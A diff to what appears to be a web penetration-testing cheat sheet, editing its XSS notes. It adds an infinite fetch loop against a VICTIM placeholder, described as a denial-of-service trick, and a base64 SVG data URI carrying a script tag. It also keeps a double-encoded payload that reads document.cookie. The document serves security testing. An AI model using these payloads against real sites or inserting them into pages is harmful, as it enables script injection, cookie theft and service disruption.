@@ -1067,9 +1067,9 @@ Manually testing for XXE vulnerabilities generally involves
 - Unusual events
   - `onpointerrawupdate` (Chrome only)
   - `onmouseleave`
-- This could lead the page to refresh quickly and infinitely causing being blocked by a WAF and being a potential DoS
-  ```HTML
-  %22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D
+- This could lead the page to make infinitely requests eventually causing being blocked by a WAF and being a potential DoS
+  ```JavaScript
+  for(;;){fetch('https://VICTIM/',{method:'GET'});}
   ```
 - [[Reference](https://twitter.com/zseano/status/1599118059511631872)]
   ```HTML
@@ -1079,6 +1079,11 @@ Manually testing for XXE vulnerabilities generally involves
   ```HTML
   %253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
   ```
+- Small SVG base64
+  ```HTML
+  data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+
+  ```
+
 
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
